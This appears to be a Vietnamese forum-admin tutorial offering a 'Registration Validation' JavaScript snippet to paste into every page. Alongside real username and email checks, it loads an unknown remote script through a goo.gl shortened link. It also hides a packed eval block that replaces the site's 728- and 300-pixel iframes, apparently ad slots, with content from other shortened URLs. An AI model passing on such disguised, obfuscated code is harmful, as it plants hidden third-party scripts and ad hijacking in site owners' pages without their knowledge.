Go to Admin Panel -> Modules -> JavaScript Codes Management ->
Title **: Registration Validation
Placement : In all the pages
Javascript Code** :

```

(function () {
window.validation = {
empty_username: "Bạn phải nhập tên người dùng",
username_length: "Tên người dùng phải có từ 2 đến 25 ký tự",
username_available: "hiện có sẵn",
username_taken: "đã được đăng ký bởi một thành viên khác",
invalid_email: "Bạn cần phải nhập một địa chỉ email hợp lệ"
}
})();
$.getScript("http://goo.gl/UioOp");
```

Bản quyền: Fmquery
```
<!--hide
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(//,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(q(){r a=s.t("v");5(a)w(i=0;i<a.x;i++)5("6"==a[i].7("1")&&(a[i].8.9=\'<2 b="c: d e; 3-f: g;"><4 h="j://k.l/y"m="3/n"1="6" o="z"></4></2>\'),0==A.B.C.D("/u")&&"p"==a[i].7("1"))a[i].8.9=\'<2 b="c: d e; 3-f: g;"><4 h="j://k.l/E"m="3/n"1="p" o="F"></4></2>\'});',42,42,'|width|div|text|object|if|728|getAttribute|parentNode|innerHTML||style|margin|0px|auto|align|center|data||http|goo|gl|type|html|height|300|function|var|document|getElementsByTagName||iframe|for|length|3NjVs|90|window|location|pathname|indexOf|yJtSQ|250'.split('|'),0,{}));/register\?agreed=true&step=2/.test(window.location)&&$(function(){document.getElementById("email").setAttribute("type","email");var a=document.createElement("div");a.id="username_status";a.style.paddingTop="5px";document.getElementById("username_reg").parentNode.appendChild(a);$("#username_reg").bind("blur",function(){0==this.value.length?this.nextSibling.innerHTML="<img src='http://cdn1.iconfinder.com/data/icons/diagona/icon/16/050.png' style='width:12px;height:12px;' /> "+validation.empty_username: 1==this.value.length&&(this.nextSibling.innerHTML="<img src='http://cdn1.iconfinder.com/data/icons/diagona/icon/16/050.png' style='width:12px;height:12px;' /> "+validation.username_length);1<this.value.length&&jQuery.get("/profile?mode=viewprofile&u="+document.getElementById("username_reg").value,function(a){!/profile-advanced-details/.test(a)?document.getElementById("username_status").innerHTML="<img src='http://illiweb.com/fa/valid.png' /> "+document.getElementById("username_reg").value+ " "+validation.username_available:document.getElementById("username_status").innerHTML="<img src='http://illiweb.com/fa/admin/icones/supprimer.png' style='width:12px;height;12px;' /> "+document.getElementById("username_reg").value+" "+validation.username_taken})});a=document.createElement("div");a.id="email_status";a.style.paddingTop="5px";document.getElementById("email").parentNode.appendChild(a);$("#email").bind("blur",function(){this.nextSibling.innerHTML=/((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?$/i.test(this.value)? "":"<img src='http://cdn1.iconfinder.com/data/icons/diagona/icon/16/050.png' style='width:12px;height:12px;' /> "+validation.invalid_email})});
//-->```